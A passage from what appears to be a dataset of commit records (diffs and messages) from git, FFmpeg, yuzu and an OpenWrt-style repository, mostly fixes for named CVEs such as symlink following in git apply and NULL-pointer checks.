    \ cnt);\n \tmemcpy(namebuf + cnt, \".rej\", 5);\n \n-\trej = fopen(namebuf, \"\
    w\");\n+\tfd = open(namebuf, O_CREAT | O_EXCL | O_WRONLY, 0666);\n+\tif (fd <\
    \ 0) {\n+\t\tif (errno != EEXIST)\n+\t\t\treturn error_errno(_(\"cannot open %s\"\
    ), namebuf);\n+\t\tif (unlink(namebuf))\n+\t\t\treturn error_errno(_(\"cannot\
    \ unlink '%s'\"), namebuf);\n+\t\tfd = open(namebuf, O_CREAT | O_EXCL | O_WRONLY,\
    \ 0666);\n+\t\tif (fd < 0)\n+\t\t\treturn error_errno(_(\"cannot open %s\"), namebuf);\n\
    +\t}\n+\trej = fdopen(fd, \"w\");\n \tif (!rej)\n \t\treturn error_errno(_(\"\
    cannot open %s\"), namebuf);\n "
  commit_message: "Merge branch 'js/apply-overwrite-rej-symlink-if-exists' into maint-2.30\n\
    \nAddress CVE-2023-25652 by deleting any existing `.rej` symbolic links\ninstead\
    \ of following them.\n\n* js/apply-overwrite-rej-symlink-if-exists:\n  apply --reject:\
    \ overwrite existing `.rej` symlink if it exists\n\nSigned-off-by: Johannes Schindelin\
    \ <Johannes.Schindelin@gmx.de>"
  commit_sha: 18e2b1cfc80990719275d7b08e6e50f3e8cbc902
  repo_name: git/git
- commit_diff:
  - "--- a/gettext.c\n+++ b/gettext.c\n@@ -109,6 +109,8 @@ static void init_gettext_charset(const\
    \ char *domain)\n \t\tsetlocale(LC_CTYPE, \"C\");\n }\n \n+int git_gettext_enabled\
    \ = 0;\n+\n void git_setup_gettext(void)\n {\n \tconst char *podir = getenv(GIT_TEXT_DOMAIN_DIR_ENVIRONMENT);\n\
    @@ -130,6 +132,8 @@ void git_setup_gettext(void)\n \tinit_gettext_charset(\"git\"\
    );\n \ttextdomain(\"git\");\n \n+\tgit_gettext_enabled = 1;\n+\n \tfree(p);\n\
    \ }\n "
  commit_message: 'gettext: avoid using gettext if the locale dir is not present


    In cc5e1bf99247 (gettext: avoid initialization if the locale dir is not

    present, 2018-04-21) Git was taught to avoid a costly gettext start-up

    when there are not even any localized messages to work with.


    But we still called `gettext()` and `ngettext()` functions.


    Which caused a problem in Git for Windows when the libgettext that is

    consumed from the MSYS2 project stopped using a runtime prefix in

    https://github.com/msys2/MINGW-packages/pull/10461


    Due to that change, we now use an unintialized gettext machinery that

    might get auto-initialized _using an unintended locale directory_:

    `C:\mingw64\share\locale`.


    Let''s record the fact when the gettext initialization was skipped, and

    skip calling the gettext functions accordingly.


    This addresses CVE-2023-25815.


    Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>'
  commit_sha: c4137be0f5a6edf9a9044e6e43ecf4468c7a4046
  repo_name: git/git
- commit_diff:
  - "--- a/apply.c\n+++ b/apply.c\n@@ -4400,6 +4400,33 @@ static int create_one_file(struct\
    \ apply_state *state,\n \tif (state->cached)\n \t\treturn 0;\n \n+\t/*\n+\t *\
    \ We already try to detect whether files are beyond a symlink in our\n+\t * up-front\
    \ checks. But in the case where symlinks are created by any\n+\t * of the intermediate\
    \ hunks it can happen that our up-front checks\n+\t * didn't yet see the symlink,\
    \ but at the point of arriving here there\n+\t * in fact is one. We thus repeat\
    \ the check for symlinks here.\n+\t *\n+\t * Note that this does not make the\
    \ up-front check obsolete as the\n+\t * failure mode is different:\n+\t *\n+\t\
    \ * - The up-front checks cause us to abort before we have written\n+\t *   anything\
    \ into the working directory. So when we exit this way the\n+\t *   working directory\
    \ remains clean.\n+\t *\n+\t * - The checks here happen in the middle of the action\
    \ where we have\n+\t *   already started to apply the patch. The end result will\
    \ be a dirty\n+\t *   working directory.\n+\t *\n+\t * Ideally, we should update\
    \ the up-front checks to catch what would\n+\t * happen when we apply the patch\
    \ before we damage the working tree.\n+\t * We have all the information necessary\
    \ to do so.  But for now, as a\n+\t * part of embargoed security work, having\
    \ this check would serve as a\n+\t * reasonable first step.\n+\t */\n+\tif (path_is_beyond_symlink(state,\
    \ path))\n+\t\treturn error(_(\"affected file '%s' is beyond a symbolic link\"\
    ), path);\n+\n \tres = try_create_file(state, path, mode, buf, size);\n \tif (res\
    \ < 0)\n \t\treturn -1;"
  commit_message: "Merge branch 'ps/apply-beyond-symlink' into maint-2.30\n\nFix a\
    \ vulnerability (CVE-2023-23946) that allows crafted input to trick\n`git apply`\
    \ into writing files outside of the working tree.\n\n* ps/apply-beyond-symlink:\n\
    \  dir-iterator: prevent top-level symlinks without FOLLOW_SYMLINKS\n\nSigned-off-by:\
    \ Johannes Schindelin <johannes.schindelin@gmx.de>"
  commit_sha: a3033a68ac3886d44ee378784ae242f25afc9970
  repo_name: git/git
- commit_diff:
  - "--- a/builtin/clone.c\n+++ b/builtin/clone.c\n@@ -1201,10 +1201,6 @@ int cmd_clone(int\
    \ argc, const char **argv, const char *prefix)\n \trefspec_appendf(&remote->fetch,\
    \ \"+%s*:%s*\", src_ref_prefix,\n \t\t\tbranch_top.buf);\n \n-\ttransport = transport_get(remote,\
    \ remote->url[0]);\n-\ttransport_set_verbosity(transport, option_verbosity, option_progress);\n\
    -\ttransport->family = family;\n-\n \tpath = get_repo_path(remote->url[0], &is_bundle);\n\
    \ \tis_local = option_local != 0 && path && !is_bundle;\n \tif (is_local) {\n\
    @@ -1224,6 +1220,10 @@ int cmd_clone(int argc, const char **argv, const char *prefix)\n\
    \ \t}\n \tif (option_local > 0 && !is_local)\n \t\twarning(_(\"--local is ignored\"\
    ));\n+\n+\ttransport = transport_get(remote, path ? path : remote->url[0]);\n\
    +\ttransport_set_verbosity(transport, option_verbosity, option_progress);\n+\t\
    transport->family = family;\n \ttransport->cloning = 1;\n \n \ttransport_set_option(transport,\
    \ TRANS_OPT_KEEP, \"yes\");"
  - "--- a/dir-iterator.c\n+++ b/dir-iterator.c\n@@ -203,7 +203,7 @@ struct dir_iterator\
    \ *dir_iterator_begin(const char *path, unsigned int flags)\n {\n \tstruct dir_iterator_int\
    \ *iter = xcalloc(1, sizeof(*iter));\n \tstruct dir_iterator *dir_iterator = &iter->base;\n\
    -\tint saved_errno;\n+\tint saved_errno, err;\n \n \tstrbuf_init(&iter->base.path,\
    \ PATH_MAX);\n \tstrbuf_addstr(&iter->base.path, path);\n@@ -213,10 +213,15 @@\
    \ struct dir_iterator *dir_iterator_begin(const char *path, unsigned int flags)\n\
    \ \titer->flags = flags;\n \n \t/*\n-\t * Note: stat already checks for NULL or\
    \ empty strings and\n-\t * inexistent paths.\n+\t * Note: stat/lstat already checks\
    \ for NULL or empty strings and\n+\t * nonexistent paths.\n \t */\n-\tif (stat(iter->base.path.buf,\
    \ &iter->base.st) < 0) {\n+\tif (iter->flags & DIR_ITERATOR_FOLLOW_SYMLINKS)\n\
    +\t\terr = stat(iter->base.path.buf, &iter->base.st);\n+\telse\n+\t\terr = lstat(iter->base.path.buf,\
    \ &iter->base.st);\n+\n+\tif (err < 0) {\n \t\tsaved_errno = errno;\n \t\tgoto\
    \ error_out;\n \t}"
  commit_message: "Merge branch 'tb/clone-local-symlinks' into maint-2.30\n\nResolve\
    \ a security vulnerability (CVE-2023-22490) where `clone_local()`\nis used in\
    \ conjunction with non-local transports, leading to arbitrary\npath exfiltration.\n\
    \n* tb/clone-local-symlinks:\n  dir-iterator: prevent top-level symlinks without\
    \ FOLLOW_SYMLINKS\n  clone: delay picking a transport until after get_repo_path()\n\
    \  t5619: demonstrate clone_local() with ambiguous transport"
  commit_sha: 2c9a4c731010685b86559c06637aeef2ac5ea06e
  repo_name: git/git
- commit_diff:
  - "--- a/fsck.c\n+++ b/fsck.c\n@@ -1170,38 +1170,41 @@ static int fsck_gitmodules_fn(const\
    \ char *var, const char *value, void *vdata)\n static int fsck_blob(const struct\
    \ object_id *oid, const char *buf,\n \t\t     unsigned long size, struct fsck_options\
    \ *options)\n {\n-\tstruct fsck_gitmodules_data data;\n-\tstruct config_options\
    \ config_opts = { 0 };\n-\n-\tif (!oidset_contains(&options->gitmodules_found,\
    \ oid))\n-\t\treturn 0;\n-\toidset_insert(&options->gitmodules_done, oid);\n+\t\
    int ret = 0;\n \n \tif (object_on_skiplist(options, oid))\n \t\treturn 0;\n \n\
    -\tif (!buf) {\n-\t\t/*\n-\t\t * A missing buffer here is a sign that the caller\
    \ found the\n-\t\t * blob too gigantic to load into memory. Let's just consider\n\
    -\t\t * that an error.\n-\t\t */\n-\t\treturn report(options, oid, OBJ_BLOB,\n\
    -\t\t\t      FSCK_MSG_GITMODULES_LARGE,\n-\t\t\t      \".gitmodules too large\
    \ to parse\");\n+\tif (oidset_contains(&options->gitmodules_found, oid)) {\n+\t\
    \tstruct config_options config_opts = { 0 };\n+\t\tstruct fsck_gitmodules_data\
    \ data;\n+\n+\t\toidset_insert(&options->gitmodules_done, oid);\n+\n+\t\tif (!buf)\
    \ {\n+\t\t\t/*\n+\t\t\t * A missing buffer here is a sign that the caller found\
    \ the\n+\t\t\t * blob too gigantic to load into memory. Let's just consider\n\
    +\t\t\t * that an error.\n+\t\t\t */\n+\t\t\treturn report(options, oid, OBJ_BLOB,\n\
    +\t\t\t\t\tFSCK_MSG_GITMODULES_LARGE,\n+\t\t\t\t\t\".gitmodules too large to parse\"\
    );\n+\t\t}\n+\n+\t\tdata.oid = oid;\n+\t\tdata.options = options;\n+\t\tdata.ret\
    \ = 0;\n+\t\tconfig_opts.error_action = CONFIG_ERROR_SILENT;\n+\t\tif (git_config_from_mem(fsck_gitmodules_fn,\
    \ CONFIG_ORIGIN_BLOB,\n+\t\t\t\t\t\".gitmodules\", buf, size, &data, &config_opts))\n\
    +\t\t\tdata.ret |= report(options, oid, OBJ_BLOB,\n+\t\t\t\t\tFSCK_MSG_GITMODULES_PARSE,\n\
    +\t\t\t\t\t\"could not parse gitmodules blob\");\n+\t\tret |= data.ret;\n \t}\n\
    \ \n-\tdata.oid = oid;\n-\tdata.options = options;\n-\tdata.ret = 0;\n-\tconfig_opts.error_action\
    \ = CONFIG_ERROR_SILENT;\n-\tif (git_config_from_mem(fsck_gitmodules_fn, CONFIG_ORIGIN_BLOB,\n\
    -\t\t\t\t\".gitmodules\", buf, size, &data, &config_opts))\n-\t\tdata.ret |= report(options,\
    \ oid, OBJ_BLOB,\n-\t\t\t\t   FSCK_MSG_GITMODULES_PARSE,\n-\t\t\t\t   \"could\
    \ not parse gitmodules blob\");\n-\n-\treturn data.ret;\n+\treturn ret;\n }\n\
    \ \n int fsck_object(struct object *obj, void *data, unsigned long size,"
  commit_message: 'fsck: refactor `fsck_blob()` to allow for more checks


    In general, we don''t need to validate blob contents as they are opaque

    blobs about whose content Git doesn''t need to care about. There are some

    exceptions though when blobs are linked into trees so that they would be

    interpreted by Git. We only have a single such check right now though,

    which is the one for gitmodules that has been added in the context of

    CVE-2018-11235.


    Now we have found another vulnerability with gitattributes that can lead

    to out-of-bounds writes and reads. So let''s refactor `fsck_blob()` so

    that it is more extensible and can check different types of blobs.


    Signed-off-by: Patrick Steinhardt <ps@pks.im>

    Signed-off-by: Junio C Hamano <gitster@pobox.com>'
  commit_sha: bb3a9265e505e9593faa260860f9b8929af0963e
  repo_name: git/git
- commit_diff:
  - "--- a/setup.c\n+++ b/setup.c\n@@ -1271,10 +1271,11 @@ static enum discovery_result\
    \ setup_git_directory_gently_1(struct strbuf *dir,\n \t\tstrbuf_setlen(dir, offset);\n\
    \ \t\tif (gitdirenv) {\n \t\t\tenum discovery_result ret;\n+\t\t\tconst char *gitdir_candidate\
    \ =\n+\t\t\t\tgitdir_path ? gitdir_path : gitdirenv;\n \n-\t\t\tif (ensure_valid_ownership(gitfile,\n\
    -\t\t\t\t\t\t dir->buf,\n-\t\t\t\t (gitdir_path ? gitdir_path : gitdirenv))) {\n\
    +\t\t\tif (ensure_valid_ownership(gitfile, dir->buf,\n+\t\t\t\t\t\t   gitdir_candidate))\
    \ {\n \t\t\t\tstrbuf_addstr(gitdir, gitdirenv);\n \t\t\t\tret = GIT_DIR_DISCOVERED;\n\
    \ \t\t\t} else"
  commit_message: 'setup: fix some formatting


    In preparation for touching code that was introduced in 3b0bf2704980

    (setup: tighten ownership checks post CVE-2022-24765, 2022-05-10) and

    that was formatted differently than preferred in the Git project, fix

    the indentation before actually modifying the code.


    Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

    Signed-off-by: Junio C Hamano <gitster@pobox.com>'
  commit_sha: d51e1dff980b9fc87002436b6ab36120a39816b1
  repo_name: git/git
- commit_diff:
  - "--- a/libavformat/oggparseflac.c\n+++ b/libavformat/oggparseflac.c\n@@ -40,7\
    \ +40,10 @@ flac_header (AVFormatContext * s, int idx)\n     if (os->buf[os->pstart]\
    \ == 0xff)\n         return 0;\n \n-    init_get_bits(&gb, os->buf + os->pstart,\
    \ os->psize*8);\n+    ret = init_get_bits8(&gb, os->buf + os->pstart, os->psize);\n\
    +    if (ret < 0)\n+        return ret;\n+\n     skip_bits1(&gb); /* metadata_last\
    \ */\n     mdt = get_bits(&gb, 7);\n "
  commit_message: 'avformat/oggparseflac: check init_get_bits'' result


    Check init_get_bits'' result for NULL, to avoid dereferencing a NULL

    pointer later (CWE-476).

    Without this, a segfault happens when trying to decode a handcrafted

    ogg-flac file with an absurdly long (e.g. 268435455 bytes) ogg header.


    Co-authored-by: James Almer <jamrial@gmail.com>

    Signed-off-by: Paul Arzelier <paul.arzelier@free.fr>'
  commit_sha: a9042db1d30483639b3ca610b74a7d43f29ea1a9
  repo_name: FFmpeg/FFmpeg
- commit_diff:
  - "--- a/src/core/hle/service/ns/ns.cpp\n+++ b/src/core/hle/service/ns/ns.cpp\n\
    @@ -26,6 +26,7 @@\n #include \"core/hle/service/ns/platform_service_manager.h\"\
    \n #include \"core/hle/service/ns/read_only_application_control_data_interface.h\"\
    \n #include \"core/hle/service/ns/read_only_application_record_interface.h\"\n\
    +#include \"core/hle/service/ns/vulnerability_manager_interface.h\"\n #include\
    \ \"core/hle/service/server_manager.h\"\n #include \"core/hle/service/set/settings_server.h\"\
    \n \n@@ -601,30 +602,6 @@ class NS_SU final : public ServiceFramework<NS_SU> {\n\
    \     }\n };\n \n-class NS_VM final : public ServiceFramework<NS_VM> {\n-public:\n\
    -    explicit NS_VM(Core::System& system_) : ServiceFramework{system_, \"ns:vm\"\
    } {\n-        // clang-format off\n-        static const FunctionInfo functions[]\
    \ = {\n-            {1200, &NS_VM::NeedsUpdateVulnerability, \"NeedsUpdateVulnerability\"\
    },\n-            {1201, nullptr, \"UpdateSafeSystemVersionForDebug\"},\n-    \
    \        {1202, nullptr, \"GetSafeSystemVersion\"},\n-        };\n-        //\
    \ clang-format on\n-\n-        RegisterHandlers(functions);\n-    }\n-\n-private:\n\
    -    void NeedsUpdateVulnerability(HLERequestContext& ctx) {\n-        LOG_WARNING(Service_NS,\
    \ \"(STUBBED) called\");\n-\n-        IPC::ResponseBuilder rb{ctx, 3};\n-    \
    \    rb.Push(ResultSuccess);\n-        rb.Push(false);\n-    }\n-};\n-\n void\
    \ LoopProcess(Core::System& system) {\n     auto server_manager = std::make_unique<ServerManager>(system);\n\
    \ \n@@ -637,7 +614,8 @@ void LoopProcess(Core::System& system) {\n \n     server_manager->RegisterNamedService(\"\
    ns:dev\", std::make_shared<NS_DEV>(system));\n     server_manager->RegisterNamedService(\"\
    ns:su\", std::make_shared<NS_SU>(system));\n-    server_manager->RegisterNamedService(\"\
    ns:vm\", std::make_shared<NS_VM>(system));\n+    server_manager->RegisterNamedService(\"\
    ns:vm\",\n+                                         std::make_shared<IVulnerabilityManagerInterface>(system));\n\
    \     server_manager->RegisterNamedService(\"pdm:qry\", std::make_shared<PDM_QRY>(system));\n\
    \ \n     server_manager->RegisterNamedService(\"pl:s\","
  - '--- a/src/core/hle/service/ns/vulnerability_manager_interface.cpp

    +++ b/src/core/hle/service/ns/vulnerability_manager_interface.cpp

    @@ -0,0 +1,31 @@

    +// SPDX-FileCopyrightText: Copyright 2024 yuzu Emulator Project

    +// SPDX-License-Identifier: GPL-2.0-or-later

    +

    +#include "core/hle/service/cmif_serialization.h"

    +#include "core/hle/service/ns/vulnerability_manager_interface.h"

    +

    +namespace Service::NS {

    +

    +IVulnerabilityManagerInterface::IVulnerabilityManagerInterface(Core::System&
    system_)

    +    : ServiceFramework{system_, "ns:vm"} {

    +    // clang-format off

    +    static const FunctionInfo functions[] = {

    +        {1200, D<&IVulnerabilityManagerInterface::NeedsUpdateVulnerability>,
    "NeedsUpdateVulnerability"},

    +        {1201, nullptr, "UpdateSafeSystemVersionForDebug"},

    +        {1202, nullptr, "GetSafeSystemVersion"},

    +    };

    +    // clang-format on

    +

    +    RegisterHandlers(functions);

    +}

    +

    +IVulnerabilityManagerInterface::~IVulnerabilityManagerInterface() = default;

    +

    +Result IVulnerabilityManagerInterface::NeedsUpdateVulnerability(

    +    Out<bool> out_needs_update_vulnerability) {

    +    LOG_WARNING(Service_NS, "(STUBBED) called");

    +    *out_needs_update_vulnerability = false;

    +    R_SUCCEED();

    +}

    +

    +} // namespace Service::NS'
  commit_message: 'ns: rewrite IVulnerabilityManagerInterface'
  commit_sha: 626f2e65b1a799d3e5c517d480a4691176fbe8d6
  repo_name: yuzu-emu/yuzu
- commit_diff:
  - "--- a/package/utils/fritz-tools/src/fritz_tffs_nand_read.c\n+++ b/package/utils/fritz-tools/src/fritz_tffs_nand_read.c\n\
    @@ -73,21 +73,18 @@ static uint8_t readbuf[TFFS_SECTOR_SIZE];\n static uint8_t\
    \ oobbuf[TFFS_SECTOR_OOB_SIZE];\n static uint32_t blocksize;\n static int mtdfd;\n\
    -struct tffs_sectors *sectors;\n-\n-struct tffs_sectors {\n-\tuint32_t num_sectors;\n\
    -\tuint8_t sectors[0];\n-};\n+static uint32_t num_sectors;\n+static uint8_t *sectors;\n\
    +static uint32_t *sector_ids;\n \n static inline void sector_mark_bad(int num)\n\
    \ {\n-\tsectors->sectors[num / 8] &= ~(0x80 >> (num % 8));\n+\tsectors[num / 8]\
    \ &= ~(0x80 >> (num % 8));\n };\n \n static inline uint8_t sector_get_good(int\
    \ num)\n {\n-\treturn sectors->sectors[num / 8] & 0x80 >> (num % 8);\n+\treturn\
    \ sectors[num / 8] & 0x80 >> (num % 8);\n };\n \n struct tffs_entry_segment {\n\
    @@ -139,6 +136,8 @@ static int read_sector(off_t pos)\n \t\treturn -1;\n \t}\n\
    \ \n+\tsector_ids[pos / TFFS_SECTOR_SIZE] = read_uint32(readbuf, 0x00);\n+\n \t\
    return 0;\n }\n \n@@ -176,25 +175,39 @@ static int find_entry(uint32_t id, struct\
    \ tffs_entry *entry)\n \n \toff_t pos = 0;\n \tuint8_t block_end = 0;\n-\tfor\
    \ (uint32_t sector = 0; sector < sectors->num_sectors; sector++, pos += TFFS_SECTOR_SIZE)\
    \ {\n+\tfor (uint32_t sector = 0; sector < num_sectors; sector++, pos += TFFS_SECTOR_SIZE)\
    \ {\n \t\tif (block_end) {\n \t\t\tif (pos % blocksize == 0) {\n \t\t\t\tblock_end\
    \ = 0;\n \t\t\t}\n \t\t} else if (sector_get_good(sector)) {\n+\t\t\tif (sector_ids[sector])\
    \ {\n+\t\t\t\tif (sector_ids[sector] == TFFS_ID_END) {\n+\t\t\t\t\t/* no more\
    \ entries in this block */\n+\t\t\t\t\tblock_end = 1;\n+\t\t\t\t\tcontinue;\n\
    +\t\t\t\t}\n+\n+\t\t\t\tif (sector_ids[sector] != id)\n+\t\t\t\t\tcontinue;\n\
    +\t\t\t}\n+\n \t\t\tif (read_sectoroob(pos) || read_sector(pos)) {\n \t\t\t\t\
    fprintf(stderr, \"ERROR: sector isn't readable, but has been previously!\\n\"\
    );\n \t\t\t\texit(EXIT_FAILURE);\n \t\t\t}\n-\t\t\tuint32_t oob_id = read_uint32(oobbuf,\
    \ 0x02);\n-\t\t\tuint32_t oob_len = read_uint32(oobbuf, 0x06);\n-\t\t\tuint32_t\
    \ oob_rev = read_uint32(oobbuf, 0x0a);\n \t\t\tuint32_t read_id = read_uint32(readbuf,\
    \ 0x00);\n \t\t\tuint32_t read_len = read_uint32(readbuf, 0x04);\n \t\t\tuint32_t\
    \ read_rev = read_uint32(readbuf, 0x0c);\n-\t\t\tif (read_oob_sector_health &&\
    \ (oob_id != read_id || oob_len != read_len || oob_rev != read_rev)) {\n-\t\t\t\
    \tfprintf(stderr, \"Warning: sector has inconsistent metadata\\n\");\n-\t\t\t\t\
    continue;\n+\t\t\tif (read_oob_sector_health) {\n+\t\t\t\tuint32_t oob_id = read_uint32(oobbuf,\
    \ 0x02);\n+\t\t\t\tuint32_t oob_len = read_uint32(oobbuf, 0x06);\n+\t\t\t\tuint32_t\
    \ oob_rev = read_uint32(oobbuf, 0x0a);\n+\n+\t\t\t\tif (oob_id != read_id || oob_len\
    \ != read_len || oob_rev != read_rev) {\n+\t\t\t\t\tfprintf(stderr, \"Warning:\
    \ sector has inconsistent metadata\\n\");\n+\t\t\t\t\tcontinue;\n+\t\t\t\t}\n\
    \ \t\t\t}\n \t\t\tif (read_id == TFFS_ID_END) {\n \t\t\t\t/* no more entries in\
    \ this block */\n@@ -414,13 +427,14 @@ static int scan_mtd(void)\n \n \tblocksize\
    \ = info.erasesize;\n \n-\tsectors = malloc(sizeof(*sectors) + (info.size / TFFS_SECTOR_SIZE\
    \ + 7) / 8);\n-\tif (sectors == NULL) {\n+\tnum_sectors = info.size / TFFS_SECTOR_SIZE;\n\
    +\tsectors = malloc((num_sectors + 7) / 8);\n+\tsector_ids = calloc(num_sectors,\
    \ sizeof(uint32_t));\n+\tif (!sectors || !sector_ids) {\n \t\tfprintf(stderr,\
    \ \"ERROR: memory allocation failed!\\n\");\n \t\texit(EXIT_FAILURE);\n \t}\n\
    -\tsectors->num_sectors = info.size / TFFS_SECTOR_SIZE;\n-\tmemset(sectors->sectors,\
    \ 0xff, (info.size / TFFS_SECTOR_SIZE + 7) / 8);\n+\tmemset(sectors, 0xff, (num_sectors\
    \ + 7) / 8);\n \n \tuint32_t sector = 0, valid_blocks = 0;\n \tuint8_t block_ok\
    \ = 0;\n@@ -564,6 +578,7 @@ int main(int argc, char *argv[])\n out_free_entry:\n\
    \ \tfree(name_table.val);\n out_free_sectors:\n+\tfree(sector_ids);\n \tfree(sectors);\n\
    \ out_close:\n \tclose(mtdfd);"
  commit_message: "treewide: sync with upstream (#10658)\n\n* rules: fix broken commitcount\
    \ on alpine system\r\n\r\nTo generate commitcount we use grep --max-count. This\
    \ is not present on\r\nalpine grep and cause wrong generation. Use -m as it's\
    \ just the short\r\nversion of --max-count and more portable.\r\n\r\nFixes: #11200\r\
    \nSigned-off-by: Christian Marangi <ansuelsmth@gmail.com>\r\n\r\n* image-commands.mk:\
    \ Be consistent in command invocation\r\n\r\nMost/all other tools use the staging\
    \ dir prefix, gzip should as well.\r\n\r\nSigned-off-by: Olliver Schinagl <oliver@schinagl.nl>\r\
    \nAcked-by: Christian Marangi <ansuelsmth@gmail.com>\r\n\r\n* image: fix device\
    \ profile specific COMPILE targets\r\n\r\nCommit a01d23e75 (\"image: always rebuild\
    \ kernel loaders\")\r\nis a step in the right direction, but exposed some issues\r\
    \nand regressions in the makefile.\r\n\r\nSome of the files made by device specific\
    \ COMPILE targets\r\nstart with an \"append\" command (i.e. >> instead of > redirection)\r\
    \nand if the file already exists, the target file is the\r\ninput to itself before\
    \ the first recipe-specified input.\r\n\r\nFixes: a01d23e75 (\"image: always rebuild\
    \ kernel loaders\")\r\nFixes: a7fb589e8 (\"image: always rebuild kernel loaders\"\
    )\r\nSigned-off-by: Michael Pratt <mcpratt@pm.me>\r\n\r\n* trusted-firmware-a.mk:\
    \ use correct CPE ID\r\n\r\nThere are 2 different CPE IDs on the NVD website:\r\
    \ncpe:/a:arm:trusted_firmware-a\r\ncpe:/o:arm:arm_trusted_firmware\r\n\r\nThe\
    \ ID as currently used in trusted-firmware-a.mk does not exist. The\r\nCPE ID\
    \ using the arm_trusted_firmware product name only lists a few\r\nrecords for\
    \ versions 2.2 and 2.3 on the NVD site. The CPE ID using the\r\ntrusted_firmware-a\
    \ product name lists many more records, and actually\r\nhas a CVE linked to it.\
    \ Therefore, use the CPE ID using the\r\ntrusted_firmware-a product name.\r\n\r\
    \nFixes: 104d60fe94ce (\"trusted-firmware-a.mk: add PKG_CPE_ID\")\r\nSigned-off-by:\
    \ Stijn Tintel <stijn@linux-ipv6.be>\r\n\r\n* fritz-tools: fritz_tffs_nand: exclude\
    \ oob code when disabled\r\n\r\nSkip unnecessary stuff if checking the oob data\
    \ is disabled.\r\n\r\nSigned-off-by: Andre Heider <a.heider@gmail.com>\r\n\r\n\
    * fritz-tools: fritz_tffs_nand: get rid of struct tffs_sectors\r\n\r\nThis doesn't\
    \ help and \"[0]\" gets in the way of bounds checks.\r\n\r\nSigned-off-by: Andre\
    \ Heider <a.heider@gmail.com>\r\n\r\n* fritz-tools: fritz_tffs_nand: cache already\
    \ read sector ids\r\n\r\nThis speeds up the tool significantly, especially when\
    \ using the \"-a\"\r\nargument.\r\n\r\nSigned-off-by: Andre Heider <a.heider@gmail.com>\r\
    \n\r\n* iproute2: add missing libbpf dependency\r\n\r\nThis patch adds libbpf\
    \ to the dependencies of tc-mod-iptables.\r\n\r\nThe package tc-mod-iptables is\
    \ missing libbpf as a dependency,\r\nwhich leads to the build failure described\
    \ in bug #9491\r\n\r\n    LIBBPF_FORCE=on set, but couldn't find a usable libbpf\r\
    \n\r\nThe build dependency is already automatically added because some other\r\
    \npackages from iproute2 depend on libbpf, but bpftools has multiple build\r\n\
    variants. With multiple build variants none gets build by default and\r\nthe build\
    \ system will not build bpftools before iproute2.\r\n\r\nFixes: #9491\r\nSigned-off-by:\
    \ Kien Truong <duckientruong@gmail.com>\r\nSigned-off-by: Hauke Mehrtens <hauke@hauke-m.de>\r\
    \n\r\n* iproute2: update to 6.0.0\r\n\r\nRelease Notes:\r\nhttps://lore.kernel.org/netdev/20221004082610.56b04719@hermes.local/t/\r\
    \n\r\nRemove upstreamed patch:\r\n- 010-ipstats-Add-param.h-for-musl.patch\r\n\
    \r\nRefreshed:\r\n- 140-keep_libmnl_optional.patch\r\n- 145-keep_libelf_optional.patch\r\
    \n- 150-keep_libcap_optional.patch\r\n- 155-keep_tirpc_optional.patch\r\n- 170-ip_tiny.patch\r\
    \n- 190-fix-nls-rpath-link.patch\r\n- 200-drop_libbsd_dependency.patch\r\n- 300-selinux-configurable.patch\r\
    \n\r\nSigned-off-by: Nick Hainke <vincent@systemli.org>\r\n\r\n* iproute2: update\
    \ to 6.1.0\r\n\r\nAnnouncement:\r\nhttps://lore.kernel.org/netdev/20221214094130.7b11ec2e@hermes.local/T/#t\r\
    \n\r\nRefresh patch:\r\n- 170-ip_tiny.patch\r\n\r\nSigned-off-by: Nick Hainke\
    \ <vincent@systemli.org>\r\n\r\n* tools/xz: update to 5.2.10\r\n\r\nUpdate to\
    \ latest version.\r\n\r\nSigned-off-by: Nick Hainke <vincent@systemli.org>\r\n\
    \r\n* Revert \"Revert \"tools/upx: remove (#10622)\"\"\r\n\r\nThis reverts commit\
    \ d3e16f203a8d238ebcf8d40e7453e8b375248e08.\r\n\r\n* kernel: Make use of KERNEL_MAKE\r\
    \n\r\nMake use of KERNEL_MAKE in kernel packages were easily possible.\r\nThis\
    \ moves some more code to common places and reduces the number of\r\nlines.\r\n\
    \r\nIt is defined like this:\r\nKERNEL_MAKE = $(MAKE) $(KERNEL_MAKEOPTS)\r\nKERNEL_MAKEOPTS\
    \ = -C $(LINUX_DIR) $(KERNEL_MAKE_FLAGS)\r\n\r\nSigned-off-by: Hauke Mehrtens\
    \ <hauke@hauke-m.de>\r\n\r\n* toolchain: gcc: backport patches to fix build with\
    \ glibc 2.36\r\n\r\nglibc 2.36 changed the definition of enum fsconfig_command,\
    \ it now\r\ncollides with the same definition from sys/mount.h. Remove the include\r\
    \nof linux/fs.h This still compiled with musl too.\r\n\r\nThis backports a patch\
    \ which is already in the stable branch of GCC 11\r\nand GCC 12.\r\n\r\nSigned-off-by:\
    \ Hauke Mehrtens <hauke@hauke-m.de>\r\n\r\n* toolchain: glibc: Update to glibc\
    \ 2.36\r\n\r\nThis updates to glibc to version 2.36.\r\n\r\nSigned-off-by: Hauke\
    \ Mehrtens <hauke@hauke-m.de>\r\n\r\n* tools/llvm: update to 15.0.6\r\n\r\nRelease\
    \ Notes:\r\n\thttps://discourse.llvm.org/t/llvm-15-0-0-release/65099\r\n\thttps://discourse.llvm.org/t/llvm-15-0-1-released/65380\r\
    \n\thttps://discourse.llvm.org/t/llvm-15-0-2-released/65695\r\n\thttps://discourse.llvm.org/t/llvm-15-0-3-released/66036\r\
    \n\thttps://discourse.llvm.org/t/llvm-15-0-4-released/66337\r\n\thttps://discourse.llvm.org/t/llvm-15-0-5-release/66616\r\
    \n\thttps://discourse.llvm.org/t/llvm-15-0-6-released/66899\r\n\r\nRemove HOST_BUILD_PARALLEL\
    \ as it's default now.\r\n\r\nSigned-off-by: Linhui Liu <liulinhui36@gmail.com>\r\
    \n\r\nSigned-off-by: Christian Marangi <ansuelsmth@gmail.com>\r\nSigned-off-by:\
    \ Olliver Schinagl <oliver@schinagl.nl>\r\nSigned-off-by: Michael Pratt <mcpratt@pm.me>\r\
    \nSigned-off-by: Stijn Tintel <stijn@linux-ipv6.be>\r\nSigned-off-by: Andre Heider\
    \ <a.heider@gmail.com>\r\nSigned-off-by: Kien Truong <duckientruong@gmail.com>\r\
    \nSigned-off-by: Hauke Mehrtens <hauke@hauke-m.de>\r\nSigned-off-by: Nick Hainke\
    \ <vincent@systemli.org>\r\nSigned-off-by: Linhui Liu <liulinhui36@gmail.com>\r\
    \nCo-authored-by: Christian Marangi <ansuelsmth@gmail.com>\r\nCo-authored-by:\
